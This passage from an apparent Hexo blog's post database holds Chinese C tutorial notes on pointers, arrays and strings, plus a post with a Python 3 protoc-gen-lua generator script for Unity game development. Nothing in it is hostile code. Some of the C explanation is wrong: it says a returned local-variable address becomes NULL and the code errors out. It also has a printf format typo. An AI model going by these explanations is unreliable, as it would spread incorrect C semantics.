798, 1, 0, 45 };\n    printf_Array(array,(sizeof(array) / sizeof(array[0])));</code></pre><pre><code>&gt;结论:数组在作为函数的形参传递过程中,需要传递首地址,还要传递数组长度,函数才可以正确将数组解析出来.\n&gt; 1. 形参中的数组不是数组,是普通的指针变量\n&gt; 2. 形参数组: int a[10000],int a[],int * a,对编译器没有区别,编译器都是当作 int * 类型来处理\n&gt; 3. 形参中的数组和非形参中的数组的区别:形参中的数组是指针变量,非形参数组就是数组\n\n* 2. 二维数组不是二级指针,指针数组才是二级指针\n\n# 指针数组和数组指针\n\n* 1. 指针数组,是数组,里面每个元素是指针.写法:</code></pre><p>char<em>* a; char</em> a[];//这个叫做指针数组,不是叫做二维数组</p>\n<pre><code>* 2. 数组指针,是指针,指向数组的指针.</code></pre><pre><code>* 3. 指针函数,是函数;错误案例,代码会直接报错,因为pointer_Function执行完毕会释放里面的变量,指针指向的值也被回收了,然后指针就指向了一个空的内存首地址,指针指向了 NULL,变成了空指针:</code></pre><p>int * pointer_Function()<br>{<br>    int a = 200;<br>    return &a;<br>}<br>void paFunction3()<br>{<br>    int* pf = pointer_Function();<br>    printf(“当前指针的内存首地址%p  当前指针内存块的值:%p  当前指针内存块所指向的内存的值:%d\\n”,&amp;pf,pf,*pf);<br>}</p>\n<pre><code>\n* 4. 函数指针,是指针\n\n* 5. 字符指针,这个是比较特殊的</code></pre><p>char str[] = “hello”;<br>printf(“%s\\n”,str);//里面是重写了输出方法<br>//是下面的输出方式<br>int i = 0;<br>while(str[i]!= ‘\\0’)<br>{<br>        printf(“c”,str[i]);<br>        i++;<br>}<br>//str本身还是首元素的内存首地址,只是输出比较特殊而已.本质还是个指针<br>char buf[100];<br>char* p = buf;</p>\n<p>strcpy(p,”wqrywegw”);//不是给p本身拷贝内容,而是给p指向的内存块拷贝内容.</p>\n<pre><code>\n\n# 字符串结束符\n\n0 数字0 与 &#39;\\0&#39; 在字符串中是一样的,都是结束符\n&#39;\\0&#39; accsi 的结束符,与数字0在字符串中是一样的\n&#39;0&#39; 字符0 ,在accsi中的数字表示是 48\n\nchar a[] = {&#39;a&#39;,&#39;b&#39;};\nprintf(&quot;%s&quot;,a);//乱码,没有结束符\n\nchar a[10] = {&#39;a&#39;,&#39;b&#39;};\nprintf(&quot;%s&quot;,a);//正常,自动补0\n\nchar a[] = {&#39;a&#39;,&#39;b&#39;,0};\nchar a[] = {&#39;a&#39;,&#39;b&#39;,&#39;\\0&#39;};\nprintf(&quot;%s&quot;,a);//正常\n\nchar a[] = {&#39;a&#39;,&#39;b&#39;&#39;0&#39;};\nprintf(&quot;%s&quot;,a);//乱码,没有结束符\n\nchar buf[] = &quot;hello&quot;;\nprintf(&quot;%s&quot;,buf);//正常,以字符串初始化,自动隐藏结束符&#39;\\0&#39;\n\n# 字符常量和字符指针数组</code></pre><pre><code>    void fun()\n    {\n             printf(&quot;%p\\n&quot;,&quot;aaa&quot;);\n    }\n    printf(&quot;%p\\n&quot;,&quot;aaa&quot;);\n    printf(&quot;%p\\n&quot;,&quot;aaa&quot;);\n    fun();\n    printf(&quot;%s\\n&quot;,&quot;aaa&quot;+1);//这种写法是正常的,因为这是将&quot;aaa&quot;当成内存首地址来使用的,类型是 char\n    printf(&quot;%c\\n&quot;,*(&quot;aaa&quot;));//取出首元素\n    //上面打印的地址都是一样的,所有的&quot;aaa&quot;就是字符常量,放在内存中的data区域,字符常量区\n\n    char buf[] = &quot;aaa&quot;;//这个字符数组所指向的字符串,并没有放在data区域,而是在栈里面\n    char *p1 = &quot;hello&quot;;//这个是字符常量,值是不可以被修改的\n    char buf[] = &quot;hello&quot;;//这个是字符指针数组,值是可以被修改的\n    char p1[100]= &quot;hello&quot;;//正确\n    p1 = &quot;hello&quot;;//错误\n    char p2[100];p2=&quot;hello&quot;;//错误,因为数组名是常量.\n    char p3[100];strcpy(p3,&quot;hello&quot;);等价于 char p1[100]= &quot;hello&quot;;</code></pre><p>```</p>\n<h1 id=\"数组-指针-符号含义\"><a href=\"#数组-指针-符号含义\" class=\"headerlink\" title=\"数组,指针,符号含义\"></a>数组,指针,符号含义</h1><ul>\n<li><ol>\n<li>使用 *p , *(p+0), p[0] 都是代表了取出内存块里面的值, *(p+1)表示: *(指针运算),这都是表达的我要直接操作内存块,而不是操作指针(内存首地址)</li>\n</ol>\n</li>\n<li><ol start=\"2\">\n<li>使用 p+0 等运算,都是对指针 p ,内存首地址进行的运算,</li>\n</ol>\n</li>\n<li><ol start=\"3\">\n<li><p>一维数组的三种操作方式 </p>\n<pre><code>           //数组有3种操作方式\n           struct Student s[3] ={};\n           //直接操作内存块\n           s[0].age = 15;\n           strcpy(s[0].name, &quot;mike&quot;);\n           s[0].score = 15;\n           //直接操作内存块\n           (*(s+1)).age = 15;\n           strcpy((*(s+1)).name, &quot;mike&quot;);\n           (*(s+1)).score = 15;\n\n           //操作内存首地址\n           (s+2)-&gt;age = 15;\n           strcpy((s+2)-&gt;name, &quot;mike&quot;);\n           (s+2)-&gt;score = 15;\n\n           //指针的写法\n           struct Student * p = &amp;s[0];// = s; 2种写法一个意思\n           //直接操作内存块\n           p[0].age = 15;\n           strcpy(p[0].name, &quot;mike&quot;);\n           p[0].score = 15;\n           //直接操作内存块\n           (*(p+1)).age = 15;\n           strcpy((*(p+1)).name, &quot;mike&quot;);\n           (*(p+1)).score = 15;\n\n           //操作内存首地址\n           (p+2)-&gt;age = 15;\n           strcpy((p+2)-&gt;name, &quot;mike&quot;);\n           (p+2)-&gt;score = 15;</code></pre></li>\n</ol>\n</li>\n</ul>\n<h1 id=\"内存概念以及管理\"><a href=\"#内存概念以及管理\" class=\"headerlink\" title=\"内存概念以及管理\"></a>内存概念以及管理</h1><ul>\n<li><ol>\n<li>简单的 int a; 这句代码已经被分配了内存首地址与内存块,而不是单纯的什么都没有.</li>\n</ol>\n</li>\n<li><ol start=\"2\">\n<li>简单的 int* p; 这句代码种 int* 合起来是一种类型,也已经分配了内存首地址与内存块,只不过内存首地址是指针变量p的内存首地址,内存块是保存指针地址(内存首地址),无法保存其他类型(int float struct … 的值).</li>\n</ol>\n</li>\n</ul>\n"},{"title":"Protobuf-Lua-Python","date":"2020-05-08T03:41:32.000Z","_content":"\n# python protobuf lua\n* 目的:游戏开发中使用lua进行数据交互,客户端与服务器进行数据互动的时候,采用protobuf方式进行数据的交互\n* 需要生成xxx_pb.lua文件,在Unity中使用tolua进行读取,创建一个proto对象,然后发送给服务器进行使用,或者服务器发送一个proto对象过来,tolua中进行读取和解析.\n\n# protoc-gen-lua 最新版使用教程\n* 老版的采用python2.7与protobuf2.5进行的数据创建 https://blog.csdn.net/huutu/article/details/49672225\n* 目前环境以及升级到了python3.8以及protobuf3.12进行生成.\n* 1:下载protobuf3.12版本,到电脑任何地方,打开里面的python文件夹,安装python3.8的环境\n* 2:下载 https://github.com/sean-lin/protoc-gen-lua 我们会修改里面的东西\n* 2:三步走\n\n```\n    python setup.py install 查看是否正常\n    python setup.py build 查看是否正常\n    python setup.py test 查看是否正常\n\n```\n\n* 3:将 xxx\\protobuf-3.12.0\\python\\google\\protobuf\\compiler\\plugin_pb2.py 替换为 xxx\\protoc-gen-lua-master\\plugin\\plugin_pb2.py, 如果前面的三步走正常,会看到这个文件的\n* 4:修改protoc-gen-lua文件为以下\n\n\n```\n    # -*- coding:utf-8 -*-\n    #!/usr/bin/env python\n    # protoc-gen-erl\n    # Google's Protocol Buffers project, ported to lua.\n    # https://code.google.com/p/protoc-gen-lua/\n    #\n    # Copyright (c) 2010 , 林卓毅 (Zhuoyi Lin) netsnail@gmail.com\n    # All rights reserved.\n    #\n    # Use, modification and distribution are subject to the \"New BSD License\"\n    # as listed at <url: http://www.opensource.org/licenses/bsd-license.php >.\n\n    import sys\n    import os.path as path\n    from io import StringIO\n\n    import plugin_pb2\n    import google.protobuf.descriptor_pb2 as descriptor_pb2\n\n    _packages = {}\n    _files = {}\n    _message = {}\n\n    FDP = plugin_pb2.google_dot_protobuf_dot_descriptor__pb2.FieldDescriptorProto\n\n    if sys.platform == \"win32\":\n        import msvcrt, os\n        msvcrt.setmode(sys.stdin.fileno(), os.O_BINARY)\n        msvcrt.setmode(sys.stdout.fileno(), os.O_BINARY)\n\n    class CppType:\n        CPPTYPE_INT32       = 1\n        CPPTYPE_INT64       = 2\n        CPPTYPE_UINT32      = 3\n        CPPTYPE_UINT64      = 4\n        CPPTYPE_DOUBLE      = 5\n        CPPTYPE_FLOAT       = 6\n        CPPTYPE_BOOL        = 7\n        CPPTYPE_ENUM        = 8\n        CPPTYPE_STRING      = 9\n        CPPTYPE_MESSAGE     = 10\n\n    CPP_TYPE ={\n        FDP.TYPE_DOUBLE         : CppType.CPPTYPE_DOUBLE,\n        FDP.TYPE_FLOAT          : CppType.CPPTYPE_FLOAT,\n        FDP.TYPE_INT64          : CppType.CPPTYPE_INT64,\n        FDP.TYPE_UINT64         : CppType.CPPTYPE_UINT64,\n        FDP.TYPE_INT32          : CppType.CPPTYPE_INT32,\n        FDP.TYPE_FIXED64        : CppType.CPPTYPE_UINT64,\n        FDP.TYPE_FIXED32        : CppType.CPPTYPE_UINT32,\n        FDP.TYPE_BOOL           : CppType.CPPTYPE_BOOL,\n        FDP.TYPE_STRING         : CppType.CPPTYPE_STRING,\n        FDP.TYPE_MESSAGE        : CppType.CPPTYPE_MESSAGE,\n        FDP.TYPE_BYTES          : CppType.CPPTYPE_STRING,\n        FDP.TYPE_UINT32         : CppType.CPPTYPE_UINT32,\n        FDP.TYPE_ENUM           : CppType.CPPTYPE_ENUM,\n        FDP.TYPE_SFIXED32       : CppType.CPPTYPE_INT32,\n        FDP.TYPE_SFIXED64       : CppType.CPPTYPE_INT64,\n        FDP.TYPE_SINT32         : CppType.CPPTYPE_INT32,\n        FDP.TYPE_SINT64         : CppType.CPPTYPE_INT64\n    }\n\n    def printerr(*args):\n        sys.stderr.write(\" \".join(args))\n        sys.stderr.write(\"\\n\")\n        sys.stderr.flush()\n\n    class TreeNode(object):\n        def __init__(self, name, parent=None, filename=None, package=None):\n            super(TreeNode, self).__init__()\n            self.child = []\n            self.parent = parent\n            self.filename = filename\n            self.package = package\n            if parent:\n                self.parent.add_child(self)\n            self.name = name\n\n        def add_child(self, child):\n            self.child.append(child)\n\n        def find_child(self, child_names):\n            if child_names:\n                for i in self.child:\n                    if i.name == child_names[0]:\n                        return i.find_child(child_names[1:])\n                raise StandardError\n            else:\n                return self\n\n        def get_child(self, child_name):\n            for i in self.child:\n                if i.name == child_name:\n                    return i\n            return None\n\n        def get_path(self, end = None):\n            pos = self\n            out = []\n            while pos and pos != end:\n                out.append(pos.name)\n                pos = pos.parent\n            out.reverse()\n            return '.'.join(out)\n\n        def get_global_name(self):\n            return self.get_path()\n\n        def get_local_name(self):\n            pos = self\n            while pos.parent:\n                pos = pos.parent\n                if self.package and pos.name == self.package[-1]:\n                    break\n            return self.get_path(pos)\n\n        def __str__(self):\n            return self.to_string(0)\n\n        def __repr__(self):\n            return str(self)\n\n        def to_string(self, indent = 0):\n            return ' '*indent + '<TreeNode ' + self.name + '(\\n' + \\\n                    ','.join([i.to_string(indent + 4) for i in self.child]) + \\\n                    ' '*indent +')>\\n'\n\n    class Env(object):\n        filename = None\n        package = None\n        extend = None\n        descriptor = None\n        message = None\n        context = None\n        register = None\n        def __init__(self):\n            self.message_tree = TreeNode('')\n            self.scope = self.message_tree\n\n        def get_global_name(self):\n            return self.scope.get_global_name()\n\n        def get_local_name(self):\n            return self.scope.get_local_name()\n\n        def get_ref_name(self, type_name):\n            try:\n                node = self.lookup_name(type_name)\n            except:\n                # if the child doesn't be founded, it must be in this file\n                return type_name[len('.'.join(self.package)) + 1:]\n            if node.filename != self.filename:\n                return node.filename + '_pb.' + node.get_local_name()\n            return node.get_local_name()\n\n        def lookup_name(self, name):\n            names = name.split('.')\n            if names[0] == '':\n                return self.message_tree.find_child(names[1:])\n            else:\n                return self.scope.parent.find_child(names)\n\n        def enter_package(self, package):\n            if not package:\n                return self.message_tree\n            names = package.split('.')\n            pos = self.message_tree\n            for i, name in enumerate(names):\n                new_pos = pos.get_child(name)\n                if new_pos:\n                    pos = new_pos\n                else:\n                    return self._build_nodes(pos, names[i:])\n            return pos\n\n        def enter_file(self, filename, package):\n            self.filename = filename\n            self.package = package.split('.')\n            self._init_field()\n            self.scope = self.enter_package(package)\n\n        def exit_file(self):\n            self._init_field()\n            self.filename = None\n            self.package = []\n            self.scope = self.scope.parent\n\n        def enter(self, message_name):\n            self.scope = TreeNode(message_name, self.scope, self.filename,\n                                self.package)\n\n        def exit(self):\n            self.scope = self.scope.parent\n\n        def _init_field(self):\n            self.descriptor = []\n            self.context = []\n            self.message = []\n            self.register = []\n\n        def _build_nodes(self, node, names):\n            parent = node\n            for i in names:\n                parent = TreeNode(i, parent, self.filename, self.package)\n            return parent\n\n    class Writer(object):\n        def __init__(self, prefix=None):\n            self.io = StringIO()\n            self.__indent = ''\n            self.__prefix = prefix\n\n        def getvalue(self):\n            return self.io.getvalue()\n\n        def __enter__(self):\n            self.__indent += '    '\n            return self\n\n        def __exit__(self, type, value, trackback):\n            self.__indent = self.__indent[:-4]\n\n        def __call__(self, data):\n            self.io.write(self.__indent)\n            if self.__prefix:\n                self.io.write(self.__prefix)\n            self.io.write(data)\n\n    DEFAULT_VALUE = {\n        FDP.TYPE_DOUBLE         : '0.0',\n        FDP.TYPE_FLOAT          : '0.0',\n        FDP.TYPE_INT64          : '0',\n        FDP.TYPE_UINT64         : '0',\n        FDP.TYPE_INT32          : '0',\n        FDP.TYPE_FIXED64        : '0',\n        FDP.TYPE_FIXED32        : '0',\n        FDP.TYPE_BOOL           : 'false',\n        FDP.TYPE_STRING         : '\"\"',\n        FDP.TYPE_MESSAGE        : 'nil',\n        FDP.TYPE_BYTES          : '\"\"',\n        FDP.TYPE_UINT32         : '0',\n        FDP.TYPE_ENUM           : '1',\n        FDP.TYPE_SFIXED32       : '0',\n        FDP.TYPE_SFIXED64       : '0',\n        FDP.TYPE_SINT32         : '0',\n        FDP.TYPE_SINT64         : '0',\n    }\n\n    def code_gen_enum_item(index, enum_value, env):\n        full_name = env.get_local_name() + '.' + enum_value.name\n        obj_name = full_name.upper().replace('.', '_') + '_ENUM'\n        env.descriptor.append(\n            \"local %s = protobuf.EnumValueDescriptor();\\n\"% obj_name\n        )\n\n        context = Writer(obj_name)\n        context('.name = \"%s\"\\n' % enum_value.name)\n        context('.index = %d\\n' % index)\n        context('.number = %d\\n' % enum_value.number)\n\n        env.context.append(context.getvalue())\n        return obj_name\n\n    def code_gen_enum(enum_desc, env):\n        env.enter(enum_desc.name)\n        full_name = env.get_local_name()\n        obj_name = full_name.upper().replace('.', '_')\n        env.descriptor.append(\n            \"local %s = protobuf.EnumDescriptor();\\n\"% obj_name\n        )\n\n        context = Writer(obj_name)\n        context('.name = \"%s\"\\n' % enum_desc.name)\n        context('.full_name = \"%s\"\\n' % env.get_global_name())\n\n        values = []\n        for i, enum_value in enumerate(enum_desc.value):\n            values.append(code_gen_enum_item(i, enum_value, env))\n        context('.values = {%s}\\n' % ','.join(values))\n\n        env.context.append(context.getvalue())\n        env.exit()\n        return obj_name\n\n    def code_gen_field(index, field_desc, env):\n        full_name = env.get_local_name() + '.' + field_desc.name\n        obj_name = full_name.upper().replace('.', '_') + '_FIELD'\n        env.descriptor.append(\n            \"local %s = protobuf.FieldDescriptor();\\n\"% obj_name\n        )\n\n        context = Writer(obj_name)\n\n        context('.name = \"%s\"\\n' % field_desc.name)\n        context('.full_name = \"%s\"\\n' % (\n            env.get_global_name() + '.' + field_desc.name))\n        context('.number = %d\\n' % field_desc.number)\n        context('.index = %d\\n' % index)\n        context('.label = %d\\n' % field_desc.label)\n\n        if field_desc.HasField(\"default_value\"):\n            context('.has_default_value = true\\n')\n            value = field_desc.default_value\n            if field_desc.type == FDP.TYPE_STRING:\n                context('.default_value = \"%s\"\\n'%value)\n            else:\n                context('.default_value = %s\\n'%value)\n        else:\n            context('.has_default_value = false\\n')\n            if field_desc.label == FDP.LABEL_REPEATED:\n                default_value = \"{}\"\n            elif field_desc.HasField('type_name'):\n                default_value = \"nil\"\n            else:\n                default_value = DEFAULT_VALUE[field_desc.type]\n            context('.default_value = %s\\n' % default_value)\n\n        if field_desc.HasField('type_name'):\n            type_name = env.get_ref_name(field_desc.type_name).upper().replace('.', '_')\n            if field_desc.type == FDP.TYPE_MESSAGE:\n                context('.message_type = %s\\n' % type_name)\n            else:\n                context('.enum_type = %s\\n' % type_name)\n\n        if field_desc.HasField('extendee'):\n            type_name = env.get_ref_name(field_desc.extendee)\n            env.register.append(\n                \"%s.RegisterExtension(%s)\\n\" % (type_name, obj_name)\n            )\n\n        context('.type = %d\\n' % field_desc.type)\n        context('.cpp_type = %d\\n\\n' % CPP_TYPE[field_desc.type])\n        env.context.append(context.getvalue())\n        return obj_name\n\n    def code_gen_message(message_descriptor, env, containing_type = None):\n        env.enter(message_descriptor.name)\n        full_name = env.get_local_name()\n        obj_name = full_name.upper().replace('.', '_')\n        env.descriptor.append(\n            \"local %s = protobuf.Descriptor();\\n\"% obj_name\n        )\n\n        context = Writer(obj_name)\n        context('.name = \"%s\"\\n' % message_descriptor.name)\n        context('.full_name = \"%s\"\\n' % env.get_global_name())\n\n        nested_types = []\n        for msg_desc in message_descriptor.nested_type:\n            msg_name = code_gen_message(msg_desc, env, obj_name)\n            nested_types.append(msg_name)\n        context('.nested_types = {%s}\\n' % ', '.join(nested_types))\n\n        enums = []\n        for enum_desc in message_descriptor.enum_type:\n            enums.append(code_gen_enum(enum_desc, env))\n        context('.enum_types = {%s}\\n' % ', '.join(enums))\n\n        fields = []\n        for i, field_desc in enumerate(message_descriptor.field):\n            fields.append(code_gen_field(i, field_desc, env))\n\n        context('.fields = {%s}\\n' % ', '.join(fields))\n        if len(message_descriptor.extension_range) > 0:\n            context('.is_extendable = true\\n')\n        else:\n            context('.is_extendable = false\\n')\n\n        extensions = []\n        for i, field_desc in enumerate(message_descriptor.extension):\n            extensions.append(code_gen_field(i, field_desc, env))\n        context('.extensions = {%s}\\n' % ', '.join(extensions))\n\n        if containing_type:\n            context('.containing_type = %s\\n' % containing_type)\n\n        env.message.append('%s = protobuf.Message(%s)\\n' % (full_name,\n                                                            obj_name))\n\n        env.context.append(context.getvalue())\n        env.exit()\n\n        # print('\\n'+str(env.descriptor)+\"\\n\")\n        # print('\\n'+str(env.context)+\"\\n\")\n        # print('\\n'+str(env.message)+\"\\n\")\n        # print('\\n'+str(env.register)+\"\\n\")\n        # print('\\n'+str(env.filename)+\"\\n\")\n        return obj_name\n\n    def write_header(writer):\n        writer(\"\"\"-- Generated By protoc-gen-lua Do not Edit\n    \"\"\")\n\n    def code_gen_file(proto_file, env, is_gen):\n        filename = path.splitext(proto_file.name)[0]\n        env.enter_file(filename, proto_file.package)\n\n        includes = []\n        for f in proto_file.dependency:\n            inc_file = path.splitext(f)[0]\n            includes.append(inc_file)\n\n    #    for field_desc in proto_file.extension:\n    #        code_gen_extensions(field_desc, field_desc.name, env)\n\n        for enum_desc in proto_file.enum_type:\n            code_gen_enum(enum_desc, env)\n            for enum_value in enum_desc.value:\n                env.message.append('%s = %d\\n' % (enum_value.name,\n                                                enum_value.number))\n\n        for msg_desc in proto_file.message_type:\n            code_gen_message(msg_desc, env)\n\n        if is_gen:\n            lua = Writer()\n            write_header(lua)\n            lua('local protobuf = require \"protobuf\"\\n')\n            for i in includes:\n                lua('local %s_pb = require(\"%s_pb\")\\n' % (i, i))\n            lua(\"module('%s_pb')\\n\" % env.filename)\n\n            lua('\\n\\n')\n            for des in env.descriptor:\n                lua(des)\n            lua('\\n')\n            for con in env.context:\n                lua(con)\n            lua('\\n')\n            env.message.sort()\n            for msg in env.message:\n                lua(msg)\n            lua('\\n')\n            for reg in env.register:\n                lua(reg)\n\n            # print('\\n'+str(env.descriptor)+\"\\n\")\n            # print('\\n'+str(env.context)+\"\\n\")\n            # print('\\n'+str(env.message)+\"\\n\")\n            # print('\\n'+str(env.register)+\"\\n\")\n            # print('\\n'+str(env.filename)+\"\\n\")\n            # print('\\n'+str(lua.getvalue())+\"\\n\")\n\n            _files[env.filename+ '_pb.lua'] = lua.getvalue()\n        env.exit_file()\n\n    def main():\n        plugin_require_bin = sys.stdin.buffer.read()\n        # print(plugin_require_bin.decode(\"utf-8\",\"ignore\"))\n        code_gen_req = plugin_pb2.CodeGeneratorRequest()\n        code_gen_req.ParseFromString(plugin_require_bin)\n\n        env = Env()\n        for proto_file in code_gen_req.proto_file:\n            code_gen_file(proto_file, env,\n                    proto_file.name in code_gen_req.file_to_generate)\n\n        code_generated = plugin_pb2.CodeGeneratorResponse()\n        for k in  _files:\n            file_desc = code_generated.file.add()\n            file_desc.name = k\n            file_desc.content = _files[k]\n        \n        sys.stdout.buffer.write(code_generated.SerializeToString())\n        for k in  _files:\n            try:\n                with open(r\"xxx/protoc-gen-lua-master/protobuf/luascript/\" + k, \"w+\") as lua_file:\n                    lua_file.write(_files[k])\n                # print(\"输出protocol-lua:\", k, \"正常\")                \n            except Exception as e:\n                # print(\"输出lua报错,请检查\")\n                print(\"xxxxxxxxxxxxxxxxxxxxxxxxxxxxx\",str(e))\n\n\n    if __name__ == \"__main__\":\n        main()\n\n\n\n\n```\n\n* 5.按照protoc-gen-lua-master文件中的解释,进行build文件,成功生成 xxx_pb.lua文件","source":"_posts/Potobuf-Lua/ProtobufLua.md","raw":"---\ntitle: Protobuf-Lua-Python\ndate: 2020-05-08 11:41:32\ncategories:\n- 工具\ntags: \n- Protobuf,lua\n---\n\n# python protobuf lua\n* 目的:游戏开发中使用lua进行数据交互,客户端与服务器进行数据互动的时候,采用protobuf方式进行数据的交互\n* 需要生成xxx_pb.lua文件,在Unity中使用tolua进行读取,创建一个proto对象,然后发送给服务器进行使用,或者服务器发送一个proto对象过来,tolua中进行读取和解析.\n\n# protoc-gen-lua 最新版使用教程\n* 老版的采用python2.7与protobuf2.5进行的数据创建 https://blog.csdn.net/huutu/article/details/49672225\n* 目前环境以及升级到了python3.8以及protobuf3.12进行生成.\n* 1:下载protobuf3.12版本,到电脑任何地方,打开里面的python文件夹,安装python3.8的环境\n* 2:下载 https://github.com/sean-lin/protoc-gen-lua 我们会修改里面的东西\n* 2:三步走\n\n```\n    python setup.py install 查看是否正常\n    python setup.py build 查看是否正常\n    python setup.py test 查看是否正常\n\n```\n\n* 3:将 xxx\\protobuf-3.12.0\\python\\google\\protobuf\\compiler\\plugin_pb2.py 替换为 xxx\\protoc-gen-lua-master\\plugin\\plugin_pb2.py, 如果前面的三步走正常,会看到这个文件的\n* 4:修改protoc-gen-lua文件为以下\n\n\n```\n    # -*- coding:utf-8 -*-\n    #!/usr/bin/env python\n    # protoc-gen-erl\n    # Google's Protocol Buffers project, ported to lua.\n    # https://code.google.com/p/protoc-gen-lua/\n    #\n    # Copyright (c) 2010 , 林卓毅 (Zhuoyi Lin) netsnail@gmail.com\n    # All rights reserved.\n    #\n    # Use, modification and distribution are subject to the \"New BSD License\"\n    # as listed at <url: http://www.opensource.org/licenses/bsd-license.php >.\n\n    import sys\n    import os.path as path\n    from io import StringIO\n\n    import plugin_pb2\n    import google.protobuf.descriptor_pb2 as descriptor_pb2\n\n    _packages = {}\n    _files = {}\n    _message = {}\n\n    FDP = plugin_pb2.google_dot_protobuf_dot_descriptor__pb2.FieldDescriptorProto\n\n    if sys.platform == \"win32\":\n        import msvcrt, os\n        msvcrt.setmode(sys.stdin.fileno(), os.O_BINARY)\n        msvcrt.setmode(sys.stdout.fileno(), os.O_BINARY)\n\n    class CppType:\n        CPPTYPE_INT32       = 1\n        CPPTYPE_INT64       = 2\n        CPPTYPE_UINT32      = 3\n        CPPTYPE_UINT64      = 4\n        CPPTYPE_DOUBLE      = 5\n        CPPTYPE_FLOAT       = 6\n        CPPTYPE_BOOL        = 7\n        CPPTYPE_ENUM        = 8\n        CPPTYPE_STRING      = 9\n        CPPTYPE_MESSAGE     = 10\n\n    CPP_TYPE ={\n        FDP.TYPE_DOUBLE         : CppType.CPPTYPE_DOUBLE,\n        FDP.TYPE_FLOAT          : CppType.CPPTYPE_FLOAT,\n        FDP.TYPE_INT64          : CppType.CPPTYPE_INT64,\n        FDP.TYPE_UINT64         : CppType.CPPTYPE_UINT64,\n        FDP.TYPE_INT32          : CppType.CPPTYPE_INT32,\n        FDP.TYPE_FIXED64        : CppType.CPPTYPE_UINT64,\n        FDP.TYPE_FIXED32        : CppType.CPPTYPE_UINT32,\n        FDP.TYPE_BOOL           : CppType.CPPTYPE_BOOL,\n        FDP.TYPE_STRING         : CppType.CPPTYPE_STRING,\n        FDP.TYPE_MESSAGE        : CppType.CPPTYPE_MESSAGE,\n        FDP.TYPE_BYTES          : CppType.CPPTYPE_STRING,\n        FDP.TYPE_UINT32         : CppType.CPPTYPE_UINT32,\n        FDP.TYPE_ENUM           : CppType.CPPTYPE_ENUM,\n        FDP.TYPE_SFIXED32       : CppType.CPPTYPE_INT32,\n        FDP.TYPE_SFIXED64       : CppType.CPPTYPE_INT64,\n        FDP.TYPE_SINT32         : CppType.CPPTYPE_INT32,\n        FDP.TYPE_SINT64         : CppType.CPPTYPE_INT64\n    }\n\n    def printerr(*args):\n        sys.stderr.write(\" \".join(args))\n        sys.stderr.write(\"\\n\")\n        sys.stderr.flush()\n\n    class TreeNode(object):\n        def __init__(self, name, parent=None, filename=None, package=None):\n            super(TreeNode, self).__init__()\n            self.child = []\n            self.parent = parent\n            self.filename = filename\n            self.package = package\n            if parent:\n                self.parent.add_child(self)\n            self.name = name\n\n        def add_child(self, child):\n            self.child.append(child)\n\n        def find_child(self, child_names):\n            if child_names:\n                for i in self.child:\n                    if i.name == child_names[0]:\n                        return i.find_child(child_names[1:])\n                raise StandardError\n            else:\n                return self\n\n        def get_child(self, child_name):\n            for i in self.child:\n                if i.name == child_name:\n                    return i\n            return None\n\n        def get_path(self, end = None):\n            pos = self\n            out = []\n            while pos and pos != end:\n                out.append(pos.name)\n                pos = pos.parent\n            out.reverse()\n            return '.'.join(out)\n\n        def get_global_name(self):\n            return self.get_path()\n\n        def get_local_name(self):\n            pos = self\n            while pos.parent:\n                pos = pos.parent\n                if self.package and pos.name == self.package[-1]:\n                    break\n            return self.get_path(pos)\n\n        def __str__(self):\n            return self.to_string(0)\n\n        def __repr__(self):\n            return str(self)\n\n        def to_string(self, indent = 0):\n            return ' '*indent + '<TreeNode ' + self.name + '(\\n' + \\\n                    ','.join([i.to_string(indent + 4) for i in self.child]) + \\\n                    ' '*indent +')>\\n'\n\n    class Env(object):\n        filename = None\n        package = None\n        extend = None\n        descriptor = None\n        message = None\n        context = None\n        register = None\n        def __init__(self):\n            self.message_tree = TreeNode('')\n            self.scope = self.message_tree\n\n        def get_global_name(self):\n            return self.scope.get_global_name()\n\n        def get_local_name(self):\n            return self.scope.get_local_name()\n\n        def get_ref_name(self, type_name):\n            try:\n                node = self.lookup_name(type_name)\n            except:\n                # if the child doesn't be founded, it must be in this file\n                return type_name[len('.'.join(self.package)) + 1:]\n            if node.filename != self.filename:\n                return node.filename + '_pb.' + node.get_local_name()\n            return node.get_local_name()\n\n        def lookup_name(self, name):\n            names = name.split('.')\n            if names[0] == '':\n                return self.message_tree.find_child(names[1:])\n            else:\n                return self.scope.parent.find_child(names)\n\n        def enter_package(self, package):\n            if not package:\n                return self.message_tree\n            names = package.split('.')\n            pos = self.message_tree\n            for i, name in enumerate(names):\n                new_pos = pos.get_child(name)\n                if new_pos:\n                    pos = new_pos\n                else:\n                    return self._build_nodes(pos, names[i:])\n            return pos\n\n        def enter_file(self, filename, package):\n            self.filename = filename\n            self.package = package.split('.')\n            self._init_field()\n            self.scope = self.enter_package(package)\n\n        def exit_file(self):\n            self._init_field()\n            self.filename = None\n            self.package = []\n            self.scope = self.scope.parent\n\n        def enter(self, message_name):\n            self.scope = TreeNode(message_name, self.scope, self.filename,\n                                self.package)\n\n        def exit(self):\n            self.scope = self.scope.parent\n\n        def _init_field(self):\n            self.descriptor = []\n            self.context = []\n            self.message = []\n            self.register = []\n\n        def _build_nodes(self, node, names):\n            parent = node\n            for i in names:\n                parent = TreeNode(i, parent, self.filename, self.package)\n            return parent\n\n    class Writer(object):\n        def __init__(self, prefix=None):\n            self.io = StringIO()\n            self.__indent = ''\n            self.__prefix = prefix\n\n        def getvalue(self):\n            return self.io.getvalue()\n\n        def __enter__(self):\n            self.__indent += '    '\n            return self\n\n        def __exit__(self, type, value, trackback):\n            self.__indent = self.__indent[:-4]\n\n        def __call__(self, data):\n            self.io.write(self.__indent)\n            if self.__prefix:\n                self.io.write(self.__prefix)\n            self.io.write(data)\n\n    DEFAULT_VALUE = {\n        FDP.TYPE_DOUBLE         : '0.0',\n        FDP.TYPE_FLOAT          : '0.0',\n        FDP.TYPE_INT64          : '0',\n        FDP.TYPE_UINT64         : '0',\n        FDP.TYPE_INT32          : '0',\n        FDP.TYPE_FIXED64        : '0',\n        FDP.TYPE_FIXED32        : '0',\n        FDP.TYPE_BOOL           : 'false',\n        FDP.TYPE_STRING         : '\"\"',\n        FDP.TYPE_MESSAGE        : 'nil',\n        FDP.TYPE_BYTES          : '\"\"',\n        FDP.TYPE_UINT32         : '0',\n        FDP.TYPE_ENUM           : '1',\n        FDP.TYPE_SFIXED32       : '0',\n        FDP.TYPE_SFIXED64       : '0',\n        FDP.TYPE_SINT32         : '0',\n        FDP.TYPE_SINT64         : '0',\n    }\n\n    def code_gen_enum_item(index, enum_value, env):\n        full_name = env.get_local_name() + '.' + enum_value.name\n        obj_name = full_name.upper().replace('.', '_') + '_ENUM'\n        env.descriptor.append(\n            \"local %s = 